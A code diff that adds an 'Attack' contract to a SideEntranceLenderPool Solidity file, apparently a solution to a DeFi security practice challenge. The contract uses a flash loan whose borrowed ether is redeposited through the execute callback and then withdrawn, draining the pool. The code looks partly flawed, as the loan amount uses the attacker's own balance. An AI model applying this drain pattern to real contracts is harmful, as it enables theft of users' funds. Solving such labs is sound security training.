@@ -2,7 +2,7 @@
 
 pragma solidity ^0.8.0;
 import "@openzeppelin/contracts/utils/Address.sol";
-
+import "hardhat/console.sol";
 interface IFlashLoanEtherReceiver {
     function execute() external payable;
 }
@@ -35,4 +35,46 @@ contract SideEntranceLenderPool {
         require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
     }
 }
+
+// attacker contract
  
+contract Attack{
+    SideEntranceLenderPool public pool;
+    constructor(SideEntranceLenderPool _address){
+        pool=SideEntranceLenderPool(_address);
+    }
+    
+    function attack( ) external    {
+        pool.flashLoan(address(this).balance);
+        pool.withdraw();
+        // _address.withdraw();
+
+
+
+
+
+    }
+    function withdraw() public {
+        payable (msg.sender).transfer(address(this).balance);
+    }
+
+    function execute() external payable{
+
+        console.log("msg.sender under excute function",msg.sender,msg.sender.balance);
+        pool.deposit{value:msg.value}();
+
+
+    }
+
+    fallback () external  payable {
+        console.log("recieve ether in fallback function of smart contract(address,value)",msg.sender,msg.value);
+
+    }
+
+
+
+
+    
+
+}
+
